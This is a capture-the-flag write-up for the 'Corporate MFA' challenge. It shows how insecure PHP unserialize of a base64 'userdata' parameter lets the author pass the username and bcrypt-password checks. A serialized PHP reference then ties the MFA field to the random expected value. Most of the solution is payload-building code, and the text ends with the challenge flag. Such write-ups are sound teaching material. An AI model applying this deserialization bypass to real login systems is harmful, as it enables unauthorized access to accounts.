
## Title: Corporate MFA
**Points:** 71  
**Solves:** 146

### Descriptions: 
The source for this corporate zero-trust multi factor login portal has been leaked! Figure out how to defeat the super-secure one time code. 

You also get a file called `corpmfa.tar.gz` and a link to a website.

### Solution:

The site is written in PHP. After investigating the source code we come to the following conclusions:
- We can send a GET request where the `userdata` parameter is first decoded as
base64 and is then deserialized using the PHP function `unserialize`.
- The unserialized object must pass through 3 checks and then we will get the flag.

The three checks are:

```php
// check 1
$userData->username === 'D0loresH4ze';

// check 2
password_verify($userData->password, '$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq')

// check 3
$userData->_correctValue = random_int(1e10, 1e11 - 1);
(int)$userData->mfa === $userData->_correctValue;
```

To pass the first check we simply use:

```php
$z = new stdClass();
$z->username = "D0loresH4ze";

$y = serialize($z);
var_dump($y);
```

For the second check, we must crack the hash `$2y$07$BCryptRequires22Chrcte/VlQH0piJtjXl.0t1XkA8pw9dMXTpOq`. After some quick googling for the hash we find that it comes from the password: `rasmuslerdorf`. ([https://pastebin.com/82giDruh](https://pastebin.com/82giDruh)) Our updated payload is:

```php
$z = new stdClass();
$z->username = "D0loresH4ze";
$z->password = "rasmuslerdorf";

$y = serialize($z);
var_dump($y);
```

And finally the third check, which is the interesting one in my mind. There
doesn't seem to be a way to predict `random_int(1e10, 1e11 - 1)`. Maybe we could
override the `=` operator. After digging in to this I didn't find anything.

Finally I looked into if PHP had anything like pointers. Apparently it has
references which can act as pointers. And the best thing, you can serialize them
and they will retain the reference! ([https://stackoverflow.com/questions/12590734/serializing-a-reference-in-php](https://stackoverflow.com/questions/12590734/serializing-a-reference-in-php))

So the final payload becomes:

```php
$z = new stdClass();
$z->username = "D0loresH4ze";
$z->password = "rasmuslerdorf";
$z->_correctValue = 5; // just to make sure that _correctvalue exists
$z->mfa = &$z->_correctValue;

$y = serialize($z);
var_dump($y);
```

Base64 encoding this and submitting this as the `userdata` parameter gave us the
flag!

**Flag:** midnight{395E160F-4DB8-4D7A-99EF-08E6799741B5} 
